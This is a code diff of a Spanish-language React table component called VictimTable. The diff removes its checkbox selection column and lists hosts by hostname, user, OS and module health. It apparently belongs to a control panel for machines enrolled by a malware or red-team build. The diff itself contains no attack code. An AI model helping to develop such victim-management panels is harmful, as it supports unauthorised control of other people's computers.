@@ -90,12 +90,11 @@ export function VictimTable({
     }
   }
 
-  const all = items.length > 0 && items.every((item) => selected.includes(item.id));
   const virtual = items.length > 200;
   const rowHeight = 40;
   const start = virtual ? Math.max(0, Math.floor(scrollTop / rowHeight) - 5) : 0;
   const end = virtual ? Math.min(items.length, start + 25) : items.length;
-  const cols = columns.length + 2;
+  const cols = columns.length + 1;
 
   if (loading) return <SkeletonRows rows={14} cols={columns.length + 1} />;
   if (items.length === 0) return <Empty title="Ningún equipo coincide" hint="Ajusta los filtros o matricula un build nuevo. La selección y el log quedan aquí." />;
@@ -114,14 +113,6 @@ export function VictimTable({
         <Table className="table-sticky min-w-[1040px] font-mono">
           <THead>
             <TR className="hover:bg-transparent">
-              <TH className="w-10">
-                <input
-                  type="checkbox"
-                  aria-label="Seleccionar todos"
-                  checked={all}
-                  onChange={() => onSelect(all ? [] : items.map((item) => item.id))}
-                />
-              </TH>
               {COLUMNS.filter((column) => columns.includes(column.id)).map((column) => (
                 <TH key={column.id} className={column.width} aria-sort={sort.id === column.id ? (sort.dir === 'asc' ? 'ascending' : 'descending') : 'none'}>
                   <button className="flex items-center gap-1 uppercase hover:text-ink" onClick={() => sortBy(column.id)}>
@@ -161,9 +152,6 @@ export function VictimTable({
                   onDoubleClick={() => onOpen(victim)}
                   onContextMenu={(event) => { event.preventDefault(); onSelect(isSelected ? selected : [victim.id]); onMenu(victim, event.clientX, event.clientY); }}
                 >
-                  <TD className="h-10" onClick={(event) => event.stopPropagation()}>
-                    <input type="checkbox" aria-label={`Seleccionar ${victim.hostname}`} checked={isSelected} onChange={() => pick(victim, index, { shiftKey: false } as React.MouseEvent)} />
-                  </TD>
                   {columns.includes('host') ? <TD className="h-10"><span className="text-ink" title={victim.hostname}>{victim.hostname}</span><span className="ml-2 hidden text-2xs text-muted/60 xl:inline">{short(victim.id, 8)}</span>{victim.health ? <Badge tone="bad" title={`Módulo degradado en los últimos 10 min: ${victim.health}. Revisa Actividad del equipo.`} aria-label={`Módulo degradado: ${victim.health}`}>!</Badge> : null}</TD> : null}
                   {columns.includes('user') ? <TD className="h-10 text-muted">{victim.username}</TD> : null}
                   {columns.includes('os') ? <TD className="h-10"><span className={osTone(victim.os)}>{osIcon(victim.os)} {victim.os}</span><span className="ml-1 text-2xs text-muted/60">{victim.osVersion.split('.')[0]}</span></TD> : null}
